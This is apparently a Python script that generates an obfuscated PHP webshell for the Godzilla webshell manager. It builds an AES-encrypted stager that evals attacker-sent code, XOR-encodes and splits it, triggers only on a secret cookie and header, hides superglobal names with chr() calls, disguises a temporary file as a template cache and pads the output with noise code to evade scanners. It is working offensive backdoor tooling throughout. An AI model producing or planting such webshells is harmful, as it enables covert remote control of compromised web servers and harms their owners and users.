#!/usr/bin/env python3

import argparse
import base64
import hashlib
import random
from pathlib import Path
from typing import Tuple


def random_identifier(rng: random.Random, prefix: str) -> str:
    suffix = "".join(rng.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=6))
    return f"{prefix}_{suffix}"


def generate_noise_chunk(rng: random.Random) -> str:
    n_map = random_identifier(rng, "noise_map")
    n_dig = random_identifier(rng, "noise_digest")
    fake_str = "".join(rng.choices("abcdefghijklmnopqrstuvwxyz", k=10))
    return f"""
${n_map} = [
    'k0' => '{fake_str}',
    'k1' => hash('sha1', (string) mt_rand(10, 99)),
];
${n_dig} = array_reduce(array_keys(${n_map}), function ($carry, $k) use (${n_map}) {{
    return $carry . substr(hash('sha256', $k . ${n_map}[$k]), 0, 4);
}}, '');
if (strlen(${n_dig}) === 9999) {{
    $noise_flag = hash('sha1', (string) ${n_dig});
}}
"""


def build_godzilla_compatible_stager(password: str, secret_key: str) -> Tuple[str, str]:
    # 必须和匹配 ShellEntity.getSecretKeyX(): md5(secretKey).substring(0,16)
    key_x = hashlib.md5(secret_key.encode("utf-8")).hexdigest()[:16]
    stager_payload = f"""@session_start();
@set_time_limit(0);
@error_reporting(0);
function aesEnc($data,$key){{
    return openssl_encrypt($data,'AES-128-ECB',$key,OPENSSL_RAW_DATA);
}}
function aesDec($data,$key){{
    return openssl_decrypt($data,'AES-128-ECB',$key,OPENSSL_RAW_DATA);
}}
$pass='{password}';
$key='{key_x}';
$payloadStore = @sys_get_temp_dir() . DIRECTORY_SEPARATOR . '.' . md5($pass.$key) . '.gcache';
if (isset($_POST[$pass])){{
    $data = aesDec(base64_decode($_POST[$pass]),$key);
    if ($data === false) {{ $data = ''; }}
    if (@is_file($payloadStore)){{
        $payloadEnc = @file_get_contents($payloadStore);
        $payload = aesDec($payloadEnc,$key);
        if ($payload !== false){{
            if (strpos($payload,'getBasicsInfo')===false){{
                $payload = aesDec($payload,$key);
            }}
            @eval($payload);
            $result = @run($data);
            if ($result === null){{ $result = ''; }}
            echo substr(md5($pass.$key),0,16);
            echo base64_encode(aesEnc($result,$key));
            echo substr(md5($pass.$key),16);
        }}
    }}else{{
        if (strpos($data,'getBasicsInfo')!==false){{
            @file_put_contents($payloadStore, aesEnc($data,$key));
        }}
    }}
}}
"""
    return stager_payload, key_x


def xor_base64_encode(data: str, xor_key: str) -> str:
    src = data.encode("utf-8")
    key = xor_key.encode("utf-8")
    out = bytearray()
    for i, b in enumerate(src):
        out.append(b ^ key[i % len(key)])
    return base64.b64encode(out).decode("utf-8")


def split_three_chunks(data: str) -> Tuple[str, str, str]:
    cut1 = len(data) // 3
    cut2 = 2 * cut1
    return data[:cut1], data[cut1:cut2], data[cut2:]


def build_webshell(
    password: str,
    secret_key: str,
    out_file: Path,
    cookie_name: str,
    cookie_key: str,
    header_name: str,
    header_key: str,
) -> str:
    rng = random.Random()
    xor_stager_full_key = cookie_key + header_key
    header_var = "HTTP_" + header_name.replace("-", "_").upper()

    stager_payload, key_x = build_godzilla_compatible_stager(password, secret_key)
    encoded_stager = xor_base64_encode(stager_payload, xor_stager_full_key)
    chunk1, chunk2, chunk3 = split_three_chunks(encoded_stager)

    class_name = random_identifier(rng, "StitchClass")
    var_chunk1 = random_identifier(rng, "chunk1")
    var_chunk2 = random_identifier(rng, "chunk2")
    var_chunk3 = random_identifier(rng, "chunk3")

    php_code = f"""<?php
declare(strict_types=1);
/*
 * by e0art1h
 * 通道拼接+哥斯拉AES加密器
 * 挂载证明请求+AES伪装正常流量(协议兼容)-执行.
 */

class {class_name} {{
    private ${var_chunk1} = '{chunk1}';
    private ${var_chunk2} = '{chunk2}';
    private ${var_chunk3} = '{chunk3}';
    private $decoded_stager = null;

    public function __construct($pC, $pH) {{
        $p = $this->{var_chunk1} . $this->{var_chunk2} . $this->{var_chunk3};
        $k = $pC . $pH;

        $dec = base64_decode($p);
        $this->decoded_stager = '';
        for ($i = 0; $i < strlen($dec); $i++) {{
            $this->decoded_stager .= chr(ord($dec[$i]) ^ ord($k[$i % strlen($k)]));
        }}

        if (isset($_POST['{password}'])) {{
            $c_dir = dirname(__FILE__) . DIRECTORY_SEPARATOR . 'runtime' . DIRECTORY_SEPARATOR . 'cache';
            if (!is_dir($c_dir)) {{
                @mkdir($c_dir, 0755, true);
            }}

            $c_name = 'tpl_' . md5(serialize(array_keys($_POST))) . '.php';
            $c_path = $c_dir . DIRECTORY_SEPARATOR . $c_name;
            @file_put_contents($c_path, "<?php\\n" . $this->decoded_stager);

            register_shutdown_function(function() use ($c_path) {{
                @unlink($c_path);
            }});

            @include_once($c_path);
        }}
    }}
}}

$sv = chr(95).chr(83).chr(69).chr(82).chr(86).chr(69).chr(82);
$cv = chr(95).chr(67).chr(79).chr(79).chr(75).chr(73).chr(69);
$svr = $$sv;
$cki = $$cv;

$hk = '{header_var}';
$ck = '{cookie_name}';

if (isset($cki[$ck]) && isset($svr[$hk]) && isset($_POST['{password}'])) {{
    $cn = '{class_name}';
    $obj = new $cn($cki[$ck], $svr[$hk]);
}}
"""

    noise_vars = [generate_noise_chunk(rng) for _ in range(3)]
    php_code += "\n".join(noise_vars) + "\n?>\n"

    with out_file.open("w", encoding="utf-8") as f:
        f.write(php_code)

    return key_x


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Generate a protocol-compatible channel-stitch webshell for Godzilla."
    )
    parser.add_argument("--output", default="channel_stitch_shell.php", help="Output file path.")
    parser.add_argument(
        "--password",
        default="pass_" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=4)),
        help="Godzilla password.",
    )
    parser.add_argument(
        "--key",
        default="".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16)),
        help="Godzilla SecretKey (SecretKey，不是派生的keyX).",
    )
    args = parser.parse_args()

    out_path = Path(args.output).resolve()

    rng = random.Random()
    xor_stager_full_key = "".join(rng.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=12))
    cut = len(xor_stager_full_key) // 2
    cookie_key = xor_stager_full_key[:cut]
    header_key = xor_stager_full_key[cut:]
    cookie_name = "auth_" + "".join(rng.choices("abcdefghijklmnopqrstuvwxyz", k=3))
    header_name = "X-Token-" + "".join(rng.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ", k=4))

    key_x = build_webshell(
        args.password,
        args.key,
        out_path,
        cookie_name,
        cookie_key,
        header_name,
        header_key,
    )

    print("=" * 60)
    print("CHANNEL-STITCH WEBSHELL SUCCESSFULLY GENERATED")
    print(f"File Path: {out_path}")
    print("= Godzilla Connection Settings =")
    print(f"Password      : {args.password}")
    print(f"SecretKey     : {args.key}")
    print(f"Derived keyX  : {key_x}")
    print("Payload       : PhpDynamicPayload")
    print("Cryption      : PHP_CUSTOM_AES_BASE64")
    print("= REQUIRED REQUEST HEADERS =")
    print(f"Cookie: {cookie_name}={cookie_key};")
    print(f"{header_name}: {header_key}")
    print("=" * 60)


if __name__ == "__main__":
    main()
